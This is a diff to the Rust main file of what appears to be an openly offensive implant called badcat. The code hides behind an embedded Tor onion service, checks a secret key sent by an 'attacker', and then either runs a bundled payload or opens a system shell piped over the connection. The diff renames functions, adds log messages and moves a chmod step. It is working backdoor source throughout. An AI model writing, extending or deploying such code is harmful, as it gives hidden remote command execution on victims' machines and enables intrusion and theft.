@@ -5,7 +5,7 @@ mod config;
 mod payload;
 mod setting;
 
-use std::{env, fs};
+use std::{env, fs, io};
 use std::error::Error;
 use std::io::{Read, Write};
 use std::net::{TcpListener, TcpStream};
@@ -14,7 +14,7 @@ use std::process::{Command, Stdio};
 
 use setting::Setting;
 
-use badcat_lib::io;
+use badcat_lib::io as badcat_io;
 use tor::Tor;
 
 fn main() -> Result<(), Box<dyn Error>> {
@@ -26,12 +26,30 @@ fn main() -> Result<(), Box<dyn Error>> {
         return payload::execute(&setting)
     }
 
-    start_tcp_server(&setting)?;
+    if cfg!(unix) {
+        // For unix-like OSes enforces the HiddenServiceDir to
+        // be private, only readable and writable by the owner.
+        //
+        // It's a best-effort approach so it can fail and hopefully
+        // all works fine. 
+        if let Ok(proc) = Command::new("chmod")
+            .args(["700", setting.tor_dir.to_str().unwrap()])
+            .status() {
+            if !proc.success() {
+                println!("WARN: problem changing data directory permission");
+            }
+        } else {
+            println!("WARN: problem calling chmod on data directory");
+        }
+    }
+
+    start_control_server(&setting)?;
 
     Ok(())
 }
 
-fn unbundle_torrc(path: &PathBuf, port: u16, setting: &Setting) -> Result<(), Box<dyn Error>> {
+/// Write a new torrc to `path`. It always reads the template torrc from `setting`.
+fn unbundle_torrc(path: &PathBuf, port: u16, setting: &Setting) -> io::Result<()> {
     let mut contents = setting.torrc.clone();
 
     contents = contents.replace("@{DATA_DIR}", setting.tor_dir.to_str().unwrap());
@@ -48,53 +66,38 @@ fn unbundle_torrc(path: &PathBuf, port: u16, setting: &Setting) -> Result<(), Bo
 
     contents = contents.replace("@{SERVICE_ADDR}", &format!("127.0.0.1:{}", port));
 
-    fs::write(&path, &contents)?;
-
-    Ok(())
+    fs::write(&path, &contents)
 }
 
-fn start_tor(config: &PathBuf, setting: &Setting) -> Result<Tor, Box<dyn Error>> {
-    // Fix directory permission - linux build requires this
-    if cfg!(unix) || cfg!(macos) {
-        let status = Command::new("chmod")
-            .args(["700", setting.tor_dir.to_str().unwrap()])
-            .stdout(Stdio::null())
-            .stderr(Stdio::null())
-            .status()?;
-
-        if !status.success() {
-            return Result::Err(String::from("problem setting app directory permision").into());
-        }
-    }
-
-    let tor = Tor::new(config);
-
-    Ok(tor)
-}
-
-fn start_tcp_server(setting: &Setting) -> Result<(), Box<dyn Error>> {
+/// Start the TCP server for receiving attacker instructions.
+fn start_control_server(setting: &Setting) -> Result<(), Box<dyn Error>> {
     let listener = TcpListener::bind("127.0.0.1:0")?;
 
     let port = listener.local_addr()?.port();
-    println!("listening at: {:?}", port);
+    println!("INFO: listening at: {:?}", port);
 
     let config = &setting.tor_dir.join("config");
     unbundle_torrc(&config, port, &setting)?;
 
-    let tor = start_tor(&config, &setting)?;
+    // start the embeded Tor instance
+    let tor = Tor::new(config);
 
     for stream in listener.incoming() {
         match stream {
             Ok(mut stream) => {
+                println!("INFO: received connection");
                 if let Ok(()) = authenticate(&mut stream, &setting) {
+                    println!("INFO: attacker authenticated");
                     if setting.uses_payload {
                         // Triggers the payload to execute
                         if let Err(err) = payload::from_process() {
                             println!("problem creating payload process: {:?}", err);
                         }
-                    } else if let Err(error) = bind_shell(stream) {
+                    } else if let Err(error) = connect_shell(stream) {
                         println!("connection error: {:?}", error);
                     }
+                } else {
+                    println!("INFO: failed authentication");
                 }
             }
             Err(error) => return Err(Box::new(error)),
@@ -106,6 +109,10 @@ fn start_tcp_server(setting: &Setting) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
+/// An extremely simple TCP authentication. Receives the password - 88 bytes
+/// by default with the 64 byte secret key - and compares against the secret key.
+/// 
+/// Sends a 1 byte one value if authenticated and zero otherwise.
 fn authenticate(stream: &mut TcpStream, setting: &Setting) -> Result<(), Box<dyn Error>> {
     let mut buf = Vec::new();
 
@@ -139,7 +146,9 @@ fn authenticate(stream: &mut TcpStream, setting: &Setting) -> Result<(), Box<dyn
     }
 }
 
-fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn Error>> {
+/// Start a shell process and redirect STDIN, STDOUT and STDERR to
+/// the TCP stream.
+fn connect_shell(stream: TcpStream) -> Result<(), Box<dyn Error>> {
     let mut args: Vec<&str> = Vec::new();
 
     let shell = if cfg!(windows) {
@@ -166,9 +175,9 @@ fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn Error>> {
     let stream_out = stream.try_clone()?;
     let stream_err = stream.try_clone()?;
 
-    let in_thread = io::pipe_io(stream_in, stdin);
-    let out_thread = io::pipe_io(stdout, stream_out);
-    let err_thread = io::pipe_io(stderr, stream_err);
+    let in_thread = badcat_io::pipe_io(stream_in, stdin);
+    let out_thread = badcat_io::pipe_io(stdout, stream_out);
+    let err_thread = badcat_io::pipe_io(stderr, stream_err);
 
     in_thread.join().unwrap();
     out_thread.join().unwrap();
